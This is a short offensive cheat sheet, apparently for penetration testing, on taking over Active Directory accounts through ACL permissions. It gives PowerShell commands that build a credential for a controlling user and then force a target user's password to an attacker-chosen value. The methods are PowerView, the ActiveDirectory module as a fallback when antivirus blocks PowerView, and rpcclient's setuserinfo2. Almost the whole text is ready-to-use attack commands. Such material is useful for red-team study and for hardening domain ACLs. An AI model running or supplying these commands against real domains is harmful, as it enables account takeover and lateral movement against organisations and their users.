# Change a User's Password Using ACL Permissions

1. **Authenticate as the Controlling User User I have**  
   - **Create a Secure String** for the password of the user with ACL permissions (e.g., `ali`):  
     ```powershell
     $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
     ```  
   - **Create a PSCredential Object** to impersonate the controlling user:  
     ```powershell
     $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
     ```  
     Replace `DOMAIN\USERNAME` (e.g., `corp.com\ali`).

2. **Define the New Password for the Target User**  
   - **Create a Secure String** for the new password (e.g., `Pwn3d_by_ACLs!`):  
     ```powershell
     $NewPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
     ```  
---

3. **Reset the Target User's Password**  
   - **Import Required Modules** (e.g., PowerView):  
     ```powershell
     Import-Module .\PowerView.ps1
     ```  
   - **Execute the Password Change**:  
     ```powershell
     Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPassword -Credential $Cred -Verbose
     ```  
     Replace `<TARGET_USER>` (e.g., `ahmed`).  
---
Another way to **Reset the Target User's Password** if powerview.ps1 cannot be executed (AV)
Set-ADAccountPassword (ActiveDirectory module)
# Example: Reset a user password to “p@ssw0rd”
``` powershell
Set-ADAccountPassword -Identity 'CN=Elisa Daugherty,OU=Accounts,DC=Fabrikam,DC=com' `
    -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force)
```
# Using rpc from owned user loggin
```
setuserinfo2 <target-user> 23 'P@ssword2022'
```
